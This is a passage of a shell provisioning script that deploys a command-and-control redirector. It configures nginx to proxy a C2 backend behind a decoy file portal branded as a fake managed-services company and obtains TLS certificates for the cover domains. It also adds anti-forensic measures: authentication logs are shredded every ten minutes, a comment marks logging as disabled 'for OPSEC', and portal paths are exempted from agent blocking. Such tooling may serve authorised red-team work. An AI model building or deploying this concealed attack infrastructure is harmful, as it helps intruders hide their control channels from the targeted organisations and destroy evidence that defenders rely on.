        var currentFolder = 'upload';
        var currentSort = 'modified';
        var sortAsc = false;
        var pendingDelete = null;

        function showToast(msg, type) {
            var t = document.getElementById('toast');
            t.textContent = msg;
            t.className = 'toast ' + (type || 'success') + ' visible';
            setTimeout(function() { t.className = 'toast'; }, 3500);
        }

        function apiFetch(url, opts) {
            opts = opts || {};
            opts.headers = opts.headers || {};
            opts.headers['X-CSRF-Token'] = csrfToken;
            return fetch(url, opts).then(function(r) {
                if (r.status === 401) { window.location.href = '/login'; return Promise.reject('auth'); }
                return r;
            });
        }

        function loadFolders() {
            fetch('/portal/api/folders').then(function(r) { return r.json(); }).then(function(data) {
                var list = document.getElementById('folder-list');
                list.innerHTML = '';
                (data.folders || []).forEach(function(name) {
                    var li = document.createElement('li');
                    li.textContent = name;
                    if (name === currentFolder) li.className = 'active';
                    li.addEventListener('click', function() { currentFolder = name; loadFolders(); loadFiles(); });
                    list.appendChild(li);
                });
            });
        }

        function loadFiles() {
            document.getElementById('current-folder-title').textContent = currentFolder;
            fetch('/portal/api/files?folder=' + encodeURIComponent(currentFolder) + '&sort=' + currentSort)
                .then(function(r) { return r.json(); })
                .then(function(data) {
                    var tbody = document.getElementById('file-tbody');
                    tbody.innerHTML = '';
                    var files = data.files || [];
                    if (files.length === 0) {
                        tbody.innerHTML = '<tr><td colspan="4" class="empty-state">No files in this folder</td></tr>';
                        return;
                    }
                    files.forEach(function(f) {
                        var tr = document.createElement('tr');
                        var tdName = document.createElement('td');
                        var a = document.createElement('a');
                        a.className = 'file-name-link';
                        a.href = '/portal/api/download/' + encodeURIComponent(currentFolder) + '/' + encodeURIComponent(f.name);
                        a.textContent = f.name;
                        tdName.appendChild(a);

                        var tdSize = document.createElement('td');
                        tdSize.textContent = f.size_human;

                        var tdMod = document.createElement('td');
                        var d = new Date(f.modified * 1000);
                        tdMod.textContent = d.toLocaleDateString() + ' ' + d.toLocaleTimeString([], {hour: '2-digit', minute: '2-digit'});

                        var tdAct = document.createElement('td');
                        var btn = document.createElement('button');
                        btn.className = 'btn-delete';
                        btn.textContent = 'Delete';
                        btn.addEventListener('click', function() {
                            pendingDelete = { folder: currentFolder, name: f.name };
                            document.getElementById('delete-filename').textContent = f.name;
                            document.getElementById('delete-modal').className = 'modal-backdrop active';
                        });
                        tdAct.appendChild(btn);

                        tr.appendChild(tdName);
                        tr.appendChild(tdSize);
                        tr.appendChild(tdMod);
                        tr.appendChild(tdAct);
                        tbody.appendChild(tr);
                    });
                });
        }

        function uploadFiles(files) {
            if (!files || files.length === 0) return;
            var formData = new FormData();
            formData.append('folder', currentFolder);
            for (var i = 0; i < files.length; i++) {
                formData.append('file' + i, files[i]);
            }
            var progWrap = document.getElementById('upload-progress');
            var progBar = document.getElementById('progress-bar');
            var progText = document.getElementById('progress-text');
            progWrap.style.display = 'block';
            progBar.style.width = '0%';
            progText.textContent = 'Uploading...';

            var xhr = new XMLHttpRequest();
            xhr.open('POST', '/portal/api/upload');
            xhr.setRequestHeader('X-CSRF-Token', csrfToken);
            xhr.upload.addEventListener('progress', function(e) {
                if (e.lengthComputable) {
                    var pct = Math.round((e.loaded / e.total) * 100);
                    progBar.style.width = pct + '%';
                    progText.textContent = 'Uploading... ' + pct + '%';
                }
            });
            xhr.addEventListener('load', function() {
                progWrap.style.display = 'none';
                if (xhr.status === 201) {
                    var resp = JSON.parse(xhr.responseText);
                    showToast('Uploaded ' + (resp.uploaded || []).length + ' file(s)', 'success');
                    loadFiles();
                } else {
                    var err = 'Upload failed';
                    try { err = JSON.parse(xhr.responseText).error || err; } catch(e) {}
                    showToast(err, 'error');
                }
            });
            xhr.addEventListener('error', function() {
                progWrap.style.display = 'none';
                showToast('Upload failed', 'error');
            });
            xhr.send(formData);
        }

        // Sort headers
        document.querySelectorAll('.file-table thead th[data-sort]').forEach(function(th) {
            th.addEventListener('click', function() {
                var newSort = th.getAttribute('data-sort');
                if (newSort === currentSort) { sortAsc = !sortAsc; } else { currentSort = newSort; sortAsc = true; }
                document.querySelectorAll('.file-table thead th .sort-arrow').forEach(function(s) { s.textContent = ''; });
                th.querySelector('.sort-arrow').textContent = sortAsc ? ' \u25B2' : ' \u25BC';
                loadFiles();
            });
        });

        // Browse button
        document.getElementById('btn-browse').addEventListener('click', function() {
            document.getElementById('file-input').click();
        });
        document.getElementById('file-input').addEventListener('change', function(e) {
            uploadFiles(e.target.files);
            e.target.value = '';
        });

        // Drag and drop
        var wrap = document.getElementById('file-table-wrap');
        var overlay = document.getElementById('drop-overlay');
        var dragCounter = 0;
        wrap.addEventListener('dragenter', function(e) {
            e.preventDefault();
            dragCounter++;
            overlay.style.display = 'flex';
        });
        wrap.addEventListener('dragleave', function(e) {
            e.preventDefault();
            dragCounter--;
            if (dragCounter <= 0) { overlay.style.display = 'none'; dragCounter = 0; }
        });
        wrap.addEventListener('dragover', function(e) { e.preventDefault(); });
        wrap.addEventListener('drop', function(e) {
            e.preventDefault();
            dragCounter = 0;
            overlay.style.display = 'none';
            uploadFiles(e.dataTransfer.files);
        });

        // New folder
        document.getElementById('btn-new-folder').addEventListener('click', function() {
            var name = prompt('Folder name (alphanumeric, hyphens, underscores):');
            if (!name) return;
            apiFetch('/portal/api/folders', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ name: name })
            }).then(function(r) { return r.json(); }).then(function(data) {
                if (data.ok) { showToast('Folder created', 'success'); currentFolder = name; loadFolders(); loadFiles(); }
                else { showToast(data.error || 'Failed', 'error'); }
            }).catch(function() { showToast('Failed to create folder', 'error'); });
        });

        // Delete modal
        document.getElementById('btn-cancel-delete').addEventListener('click', function() {
            document.getElementById('delete-modal').className = 'modal-backdrop';
            pendingDelete = null;
        });
        document.getElementById('btn-confirm-delete').addEventListener('click', function() {
            if (!pendingDelete) return;
            var folder = pendingDelete.folder;
            var name = pendingDelete.name;
            document.getElementById('delete-modal').className = 'modal-backdrop';
            apiFetch('/portal/api/files/' + encodeURIComponent(folder) + '/' + encodeURIComponent(name), {
                method: 'DELETE'
            }).then(function(r) { return r.json(); }).then(function(data) {
                if (data.ok) { showToast('File deleted', 'success'); loadFiles(); }
                else { showToast(data.error || 'Failed', 'error'); }
            }).catch(function() { showToast('Failed to delete file', 'error'); });
            pendingDelete = null;
        });

        // Shared clipboard — manual Push/Pull only
        var clipboardEl = document.getElementById('clipboard-text');
        var clipboardStatus = document.getElementById('clipboard-status');

        document.getElementById('clipboard-toggle').addEventListener('click', function() {
            var body = document.getElementById('clipboard-body');
            var hint = document.getElementById('clipboard-expand-hint');
            body.classList.toggle('open');
            if (hint) hint.style.display = body.classList.contains('open') ? 'none' : 'inline';
        });

        function pullClipboard() {
            clipboardStatus.textContent = 'pulling...';
            fetch('/portal/api/clipboard').then(function(r) { return r.json(); }).then(function(data) {
                clipboardEl.value = data.text || '';
                clipboardStatus.textContent = data.updated_at > 0 ? 'pulled' : 'empty';
            }).catch(function() { clipboardStatus.textContent = 'pull failed'; });
        }

        function pushClipboard() {
            clipboardStatus.textContent = 'pushing...';
            apiFetch('/portal/api/clipboard', {
                method: 'PUT',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ text: clipboardEl.value })
            }).then(function(r) { return r.json(); }).then(function(data) {
                clipboardStatus.textContent = 'pushed';
            }).catch(function() { clipboardStatus.textContent = 'push failed'; });
        }

        window.pullClipboard = pullClipboard;
        window.pushClipboard = pushClipboard;

        // Init
        loadFolders();
        loadFiles();
    })();
    </script>
</body>
</html>"""

ERROR_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Page Not Found | Plexura Managed Solutions</title>
    <style>
        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: #f8f9fa;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        .header {
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            padding: 16px 0;
        }
        .header-inner {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 20px;
        }
        .logo {
            color: #fff;
            font-size: 1.5em;
            font-weight: 700;
        }
        .logo span { color: #4a9eff; }
        .main {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 40px 20px;
            text-align: center;
        }
        .error-card {
            max-width: 440px;
        }
        .error-card h1 {
            font-size: 1.6em;
            font-weight: 700;
            color: #1a1a2e;
            margin-bottom: 12px;
        }
        .error-card p {
            color: #666;
            font-size: 0.92em;
            margin-bottom: 28px;
            line-height: 1.6;
        }
        .error-card a {
            display: inline-block;
            padding: 11px 32px;
            background: #4a9eff;
            color: #fff;
            text-decoration: none;
            border-radius: 5px;
            font-weight: 600;
            font-size: 0.9em;
            transition: background 0.3s;
        }
        .error-card a:hover { background: #3a8eef; }
        .footer {
            background: #1a1a2e;
            color: #666;
            text-align: center;
            padding: 16px 20px;
            font-size: 0.8em;
        }
    </style>
</head>
<body>
    <header class="header">
        <div class="header-inner">
            <span class="logo">Plexura<span>MS</span></span>
        </div>
    </header>
    <main class="main">
        <div class="error-card">
            <h1>Page Not Found</h1>
            <p>The page you are looking for could not be found. Please check the URL or return to the home page.</p>
            <a href="/login">Return to Login</a>
        </div>
    </main>
    <footer class="footer">
        <p>&copy; 2024 Plexura Managed Solutions. All rights reserved.</p>
    </footer>
</body>
</html>"""

content = content.replace("PLACEHOLDER_LOGIN_TEMPLATE", LOGIN_HTML)
content = content.replace("PLACEHOLDER_PORTAL_TEMPLATE", PORTAL_HTML)
content = content.replace("PLACEHOLDER_ERROR_TEMPLATE", ERROR_HTML)

with open('/opt/portal/app.py', 'w') as f:
    f.write(content)
print("Plexura templates injected")
TEMPLATEEOF
    fi

    # Write systemd service
    cat > /etc/systemd/system/portal.service << 'SVCEOF'
[Unit]
Description=File Portal
After=network.target

[Service]
User=www-data
WorkingDirectory=/opt/portal
ExecStart=/usr/bin/gunicorn --bind 127.0.0.1:8443 --workers 1 --threads 2 --timeout 120 app:app
Restart=always
Environment=PORTAL_CONFIG=/etc/portal/credentials
Environment=PORTAL_SESSION_TIMEOUT=PLACEHOLDER_TIMEOUT

[Install]
WantedBy=multi-user.target
SVCEOF
    # Replace timeout placeholder
    sed -i "s/PLACEHOLDER_TIMEOUT/$${PORTAL_SESSION_TIMEOUT}/" /etc/systemd/system/portal.service

    # Configure fail2ban jail
    cat > /etc/fail2ban/jail.d/portal.conf << 'F2BEOF'
[portal]
enabled = true
port = http,https
filter = portal
logpath = /dev/shm/portal-auth.log
maxretry = 5
findtime = 600
bantime = 1800
F2BEOF

    cat > /etc/fail2ban/filter.d/portal.conf << 'F2BFILTEREOF'
[Definition]
failregex = PORTAL_AUTH_FAIL ip=<HOST>
ignoreregex =
F2BFILTEREOF

    # Touch auth log on tmpfs so fail2ban can start
    touch /dev/shm/portal-auth.log
    chown www-data:www-data /dev/shm/portal-auth.log

    # Logrotate — aggressive shredding (every 10 min via cron)
    cat > /etc/cron.d/portal-logrotate << 'CRONEOF'
*/10 * * * * root /usr/sbin/logrotate -f /etc/logrotate.d/portal-auth
CRONEOF

    cat > /etc/logrotate.d/portal-auth << 'LREOF'
/dev/shm/portal-auth.log {
    rotate 1
    size 0
    missingok
    notifempty
    shred
    shredcycles 3
    postrotate
        touch /dev/shm/portal-auth.log
        chown www-data:www-data /dev/shm/portal-auth.log
    endscript
}
LREOF

    # Modify nginx configs using Python for reliability (avoids fragile sed regex escaping)
    NGINX_CONF="/etc/nginx/sites-available/c2-redirector"
    python3 << 'NGINXPATCH'
import re

# 1. Add rate limit zones and portal_path map to nginx.conf http{} context
with open('/etc/nginx/nginx.conf') as f:
    content = f.read()

http_additions = """
    # File Portal rate limiting
    limit_req_zone $binary_remote_addr zone=login:5m rate=5r/m;
    limit_req_zone $binary_remote_addr zone=portal:10m rate=30r/m;

    # File Portal path detection (for blocked_agent exemption)
    map $uri $portal_path {
        ~^/login   1;
        ~^/portal/ 1;
        default    0;
    }
"""
content = content.replace('http {', 'http {' + http_additions, 1)
with open('/etc/nginx/nginx.conf', 'w') as f:
    f.write(content)

# 2. Add portal location blocks to site config (before location /health)
with open('/etc/nginx/sites-available/c2-redirector') as f:
    content = f.read()

portal_locations = """
    # Block direct access to uploads
    location /uploads/ {
        deny all;
        return 404;
    }

    # File Portal - Login
    # Security headers: hide Flask upstream copies, set single authoritative source via nginx
    location /login {
        limit_req zone=login burst=3 nodelay;
        proxy_hide_header X-Frame-Options;
        proxy_hide_header X-Content-Type-Options;
        proxy_hide_header X-XSS-Protection;
        proxy_hide_header Strict-Transport-Security;
        proxy_hide_header Referrer-Policy;
        proxy_hide_header Permissions-Policy;
        proxy_hide_header Content-Security-Policy;
        add_header X-Frame-Options "DENY" always;
        add_header X-Content-Type-Options "nosniff" always;
        add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
        add_header Referrer-Policy "no-referrer" always;
        add_header Permissions-Policy "camera=(), microphone=(), geolocation=()" always;
        add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; form-action 'self'" always;
        proxy_pass http://127.0.0.1:8443/login;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $remote_addr;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header Connection "";
        proxy_connect_timeout 10s;
        proxy_read_timeout 30s;
    }

    # File Portal - Portal routes
    location /portal/ {
        limit_req zone=portal burst=10 nodelay;
        proxy_hide_header X-Frame-Options;
        proxy_hide_header X-Content-Type-Options;
        proxy_hide_header X-XSS-Protection;
        proxy_hide_header Strict-Transport-Security;
        proxy_hide_header Referrer-Policy;
        proxy_hide_header Permissions-Policy;
        proxy_hide_header Content-Security-Policy;
        add_header X-Frame-Options "DENY" always;
        add_header X-Content-Type-Options "nosniff" always;
        add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
        add_header Referrer-Policy "no-referrer" always;
        add_header Permissions-Policy "camera=(), microphone=(), geolocation=()" always;
        add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; form-action 'self'" always;
        client_max_body_size 100M;
        proxy_request_buffering off;
        proxy_pass http://127.0.0.1:8443/portal/;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $remote_addr;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header Connection "";
        proxy_connect_timeout 10s;
        proxy_read_timeout 120s;
        proxy_send_timeout 120s;
    }

"""
content = content.replace('    location /health', portal_locations + '    location /health', 1)

# 3. Update blocked_agent check to exempt portal paths
content = content.replace(
    'if ($blocked_agent) {',
    'set $block_check "$${blocked_agent}$${portal_path}";\n        if ($block_check = "10") {',
    1
)

with open('/etc/nginx/sites-available/c2-redirector', 'w') as f:
    f.write(content)

print("nginx configs patched successfully")
NGINXPATCH

    # Enable and start services
    systemctl daemon-reload
    systemctl enable portal.service
    systemctl start portal.service
    systemctl restart fail2ban
    nginx -t && systemctl reload nginx

    echo "File portal deployed successfully"
    write_step_status 3 "File Portal" "ok" "Portal deployed on /login"
else
    echo "File portal not enabled (enable_file_portal=false)"
fi

# =============================================================================
# 4. SSL Certificate Setup
# =============================================================================
echo "[4/5] Setting up SSL..."

mkdir -p /etc/nginx/ssl
mkdir -p /opt/ssl-scripts

# Get this server's public IP
MY_PUBLIC_IP=$(curl -s --max-time 10 https://api.ipify.org || curl -s --max-time 10 https://ifconfig.me || echo "unknown")
echo "This server's public IP: $MY_PUBLIC_IP"

# Function to update SSL status
update_ssl_status() {
    local status=$1
    local message=$2
    local cert_type=$3
    local expiry=$4
    
    cat > "$SSL_STATUS_FILE" << STATUSEOF
{
    "status": "$status",
    "message": "$message",
    "cert_type": "$cert_type",
    "expiry": "$expiry",
    "domain": "$C2_FQDN",
    "provider": "$SSL_PROVIDER",
    "last_updated": "$(date -Iseconds)",
    "public_ip": "$MY_PUBLIC_IP"
}
STATUSEOF
    chmod 644 "$SSL_STATUS_FILE"
}

# Function to check if DNS resolves to this server
# Handles multiple A records (e.g., 2 redirectors behind round-robin DNS)
check_dns_ready() {
    local resolved_ips=$(dig +short "$C2_FQDN" 2>/dev/null)
    if echo "$resolved_ips" | grep -qF "$MY_PUBLIC_IP"; then
        return 0
    fi
    return 1
}

# Function to request Let's Encrypt certificate using DNS-01 validation
# DNS-01 creates a TXT record in Route53 to prove domain ownership
# This works reliably with round-robin DNS (multiple A records / multiple redirectors)
# unlike HTTP-01 which fails when the validation request hits the wrong server
request_letsencrypt_cert() {
    echo "Requesting Let's Encrypt certificate for $C2_FQDN (DNS-01 via Route53)..."

    # Step 1: Get the certificate using DNS-01 challenge (certonly, no nginx plugin needed)
    # Include all subdomains (www, cdn, apex) so the cert covers the full nginx server_name list
    if certbot certonly \
        --dns-route53 \
        -d "$C2_FQDN" \
        -d "$PRIMARY_DOMAIN" \
        -d "www.$PRIMARY_DOMAIN" \
        -d "cdn.$PRIMARY_DOMAIN" \
        --non-interactive --agree-tos --email "$ADMIN_EMAIL" \
        2>&1; then

        echo "Let's Encrypt certificate obtained successfully via DNS-01!"

        # Step 2: Point nginx at the Let's Encrypt cert instead of the self-signed one
        local LE_CERT="/etc/letsencrypt/live/$C2_FQDN/fullchain.pem"
        local LE_KEY="/etc/letsencrypt/live/$C2_FQDN/privkey.pem"

        if [ -f "$LE_CERT" ] && [ -f "$LE_KEY" ]; then
            # Update nginx SSL paths to use Let's Encrypt cert
            sed -i "s|ssl_certificate .*|ssl_certificate $LE_CERT;|" /etc/nginx/sites-available/c2-redirector
            sed -i "s|ssl_certificate_key .*|ssl_certificate_key $LE_KEY;|" /etc/nginx/sites-available/c2-redirector

            # Reload nginx to pick up the new cert
            nginx -t && systemctl reload nginx
            echo "Nginx updated with Let's Encrypt certificate"
        fi

        # Get certificate expiry
        local expiry=$(openssl x509 -enddate -noout -in "$LE_CERT" 2>/dev/null | cut -d= -f2 || echo "unknown")

        update_ssl_status "valid" "Lets Encrypt certificate active" "letsencrypt" "$expiry"

        # Disable the auto-retry service since we succeeded
        systemctl disable ssl-auto-request.timer 2>/dev/null || true
        systemctl stop ssl-auto-request.timer 2>/dev/null || true

        return 0
    else
        echo "Let's Encrypt DNS-01 request failed"
        update_ssl_status "pending" "Lets Encrypt request failed - will retry" "self-signed" "N/A"
        return 1
    fi
}

# Create self-signed certificate (always needed as fallback/initial)
create_self_signed_cert() {
    echo "Creating self-signed certificate..."
    openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
        -keyout /etc/nginx/ssl/server.key \
        -out /etc/nginx/ssl/server.crt \
        -subj "/CN=$C2_FQDN/O=Plexura Managed Solutions/C=US"
    
    chmod 600 /etc/nginx/ssl/server.key
    chmod 644 /etc/nginx/ssl/server.crt
    
    update_ssl_status "self-signed" "Using self-signed certificate" "self-signed" "$(date -d '+365 days' -Iseconds 2>/dev/null || echo 'unknown')"
}

# Create the auto-retry script for Let's Encrypt
create_ssl_auto_retry_script() {
    cat > /opt/ssl-scripts/auto-request-cert.sh << 'AUTOSCRIPT'
#!/bin/bash
# Auto-request Let's Encrypt certificate when DNS is ready
# This script is run by systemd timer

LOG_FILE="/var/log/ssl-auto-request.log"
exec >> "$LOG_FILE" 2>&1

echo "=============================================="
echo "SSL Auto-Request Check: $(date)"
echo "=============================================="

# Load config
source /opt/ssl-scripts/ssl-config.env

# Get current public IP
MY_PUBLIC_IP=$(curl -s --max-time 10 https://api.ipify.org || echo "unknown")

# Check if DNS resolves to this server
RESOLVED_IPS=$(dig +short "$C2_FQDN" 2>/dev/null)

echo "Domain: $C2_FQDN"
echo "This server IP: $MY_PUBLIC_IP"
echo "DNS resolved IPs: $RESOLVED_IPS"
echo "(DNS-01 validation does NOT require DNS to resolve to this server)"

# Check if we already have a valid Let's Encrypt cert
if [ -f "/etc/letsencrypt/live/$C2_FQDN/fullchain.pem" ]; then
    echo "Let's Encrypt certificate already exists"

    # Update status
    EXPIRY=$(openssl x509 -enddate -noout -in /etc/letsencrypt/live/$C2_FQDN/fullchain.pem 2>/dev/null | cut -d= -f2 || echo "unknown")
    cat > /opt/ssl-status.json << EOF
{
    "status": "valid",
    "message": "Lets Encrypt certificate active",
    "cert_type": "letsencrypt",
    "expiry": "$EXPIRY",
    "domain": "$C2_FQDN",
    "provider": "letsencrypt",
    "last_updated": "$(date -Iseconds)",
    "public_ip": "$MY_PUBLIC_IP"
}
EOF

    # Disable timer
    systemctl disable ssl-auto-request.timer
    systemctl stop ssl-auto-request.timer
    exit 0
fi

# Request certificate using DNS-01 via Route53
# DNS-01 validates via TXT record in Route53 — does NOT need the domain to resolve to this server
# This means we can request the cert even before the registrar nameservers are updated
echo "Requesting Let's Encrypt certificate via DNS-01 (Route53)..."

if certbot certonly \
    --dns-route53 \
    -d "$C2_FQDN" \
    -d "$PRIMARY_DOMAIN" \
    -d "www.$PRIMARY_DOMAIN" \
    -d "cdn.$PRIMARY_DOMAIN" \
    --non-interactive --agree-tos --email "$ADMIN_EMAIL" 2>&1; then

    echo "SUCCESS: Let's Encrypt certificate obtained via DNS-01!"

    # Update nginx to use the Let's Encrypt cert
    LE_CERT="/etc/letsencrypt/live/$C2_FQDN/fullchain.pem"
    LE_KEY="/etc/letsencrypt/live/$C2_FQDN/privkey.pem"
    if [ -f "$LE_CERT" ] && [ -f "$LE_KEY" ]; then
        sed -i "s|ssl_certificate .*|ssl_certificate $LE_CERT;|" /etc/nginx/sites-available/c2-redirector
        sed -i "s|ssl_certificate_key .*|ssl_certificate_key $LE_KEY;|" /etc/nginx/sites-available/c2-redirector
        nginx -t && systemctl reload nginx
    fi

    EXPIRY=$(openssl x509 -enddate -noout -in "$LE_CERT" 2>/dev/null | cut -d= -f2 || echo "unknown")
    cat > /opt/ssl-status.json << EOF
{
    "status": "valid",
    "message": "Lets Encrypt certificate active",
    "cert_type": "letsencrypt",
    "expiry": "$EXPIRY",
    "domain": "$C2_FQDN",
    "provider": "letsencrypt",
    "last_updated": "$(date -Iseconds)",
    "public_ip": "$MY_PUBLIC_IP"
}
EOF

    # Disable timer since we succeeded
    systemctl disable ssl-auto-request.timer
    systemctl stop ssl-auto-request.timer

    echo "Timer disabled - certificate obtained"
else
    echo "FAILED: Let's Encrypt DNS-01 request failed - will retry in 5 minutes"

    # Log possible causes
    echo "Possible causes: IAM role not ready (eventual consistency), Route53 hosted zone not found, rate limit"

    cat > /opt/ssl-status.json << EOF
{
    "status": "pending",
    "message": "Lets Encrypt request failed - will retry in 5 minutes",
    "cert_type": "self-signed",
    "expiry": "N/A",
    "domain": "$C2_FQDN",
    "provider": "letsencrypt",
    "last_updated": "$(date -Iseconds)",
    "public_ip": "$MY_PUBLIC_IP"
}
EOF
fi

echo "Check complete"
echo ""
AUTOSCRIPT

    chmod +x /opt/ssl-scripts/auto-request-cert.sh
    
    # Save config for the auto-retry script
    cat > /opt/ssl-scripts/ssl-config.env << CONFIGEOF
C2_FQDN="$C2_FQDN"
PRIMARY_DOMAIN="$PRIMARY_DOMAIN"
ADMIN_EMAIL="$ADMIN_EMAIL"
CONFIGEOF
    
    chmod 600 /opt/ssl-scripts/ssl-config.env
}

# Create systemd service and timer for auto-retry
create_ssl_auto_retry_service() {
    # Service file
    cat > /etc/systemd/system/ssl-auto-request.service << 'SERVICEEOF'
[Unit]
Description=Auto-request Let's Encrypt SSL certificate when DNS is ready
After=network-online.target nginx.service
Wants=network-online.target

[Service]
Type=oneshot
ExecStart=/opt/ssl-scripts/auto-request-cert.sh
StandardOutput=journal
StandardError=journal
SERVICEEOF

    # Timer file (runs every 5 minutes)
    cat > /etc/systemd/system/ssl-auto-request.timer << 'TIMEREOF'
[Unit]
Description=Check DNS and request SSL certificate every 5 minutes

[Timer]
OnBootSec=2min
OnUnitActiveSec=5min
Persistent=true

[Install]
WantedBy=timers.target
TIMEREOF

    systemctl daemon-reload
}

# Main SSL setup logic
if [ "$ENABLE_SSL" = "true" ]; then
    if [ "$SSL_PROVIDER" = "letsencrypt" ] && [ -n "$ADMIN_EMAIL" ]; then
        echo "SSL Provider: Let's Encrypt"
        echo "Admin Email: $ADMIN_EMAIL"
        echo "Auto-Retry: $SSL_AUTO_RETRY"
        
        # Always create self-signed cert first (nginx needs a cert to start)
        create_self_signed_cert
        
        # Create the auto-retry script
        create_ssl_auto_retry_script
        create_ssl_auto_retry_service
        
        # DNS-01 validation via Route53 doesn't need DNS to resolve to this server
        # It validates by creating a TXT record, so we can try immediately
        # Start nginx first (it needs the self-signed cert to boot)
        systemctl start nginx || true

        echo "Attempting Let's Encrypt DNS-01 certificate request..."
        if request_letsencrypt_cert; then
            echo "Certificate obtained on first attempt!"
        else
            echo "First attempt failed (IAM role may not be ready yet)"
            update_ssl_status "pending" "Lets Encrypt request failed - will retry" "self-signed" "N/A"
            
            if [ "$SSL_AUTO_RETRY" = "true" ]; then
                echo "Enabling auto-retry timer..."
                systemctl enable ssl-auto-request.timer
                systemctl start ssl-auto-request.timer
                echo "Auto-retry enabled - will check every 5 minutes"
            else
                echo "Auto-retry disabled - manual certificate request required"
                update_ssl_status "manual_required" "DNS not ready - manual certificate request required" "self-signed" "N/A"
            fi
        fi
        
    else
        echo "SSL Provider: Self-Signed"
        create_self_signed_cert
    fi
else
    echo "SSL disabled - creating placeholder cert..."
    openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
        -keyout /etc/nginx/ssl/server.key \
        -out /etc/nginx/ssl/server.crt \
        -subj "/CN=localhost"
    
    chmod 600 /etc/nginx/ssl/server.key
    chmod 644 /etc/nginx/ssl/server.crt
    
    update_ssl_status "disabled" "SSL disabled" "none" "N/A"
fi

echo "SSL setup complete"
write_step_status 4 "SSL Setup" "ok"

# =============================================================================
# 5. Start Services
# =============================================================================
echo "[5/5] Starting services..."

# Test nginx config
nginx -t

# Enable and start nginx
systemctl enable nginx
systemctl restart nginx

# Setup automatic cert renewal (if using Let's Encrypt with DNS-01)
# The --deploy-hook reloads nginx after successful renewal
if [ "$SSL_PROVIDER" = "letsencrypt" ]; then
    echo "0 12 * * * root certbot renew --quiet --deploy-hook 'systemctl reload nginx'" > /etc/cron.d/certbot-renew
fi

# Configure fail2ban for nginx
# Note: Logging is disabled for OPSEC, so fail2ban only monitors nginx auth
cat > /etc/fail2ban/jail.local << 'FAIL2BANEOF'
[DEFAULT]
bantime = 3600
findtime = 600
maxretry = 5

[nginx-http-auth]
enabled = true

# OPSEC: Bot/access log monitoring disabled since logging is off
# Relying on external network-level protection instead
FAIL2BANEOF

systemctl enable fail2ban
systemctl restart fail2ban

write_step_status 5 "Services" "ok"

echo ""
echo "=============================================="
echo "Proxy Redirector Setup Complete!"
echo "Finished: $(date)"
echo "=============================================="
echo ""
echo "Domain: $PRIMARY_DOMAIN"
echo "C2 FQDN: $C2_FQDN"
echo "C2 Backend: $C2_SERVER_IP:$C2_SERVER_PORT"
echo "SSL: $ENABLE_SSL"
echo ""
echo "Test with: curl -k https://$C2_FQDN/health"
echo ""

# Create completion marker
touch /opt/.redirector-setup-complete

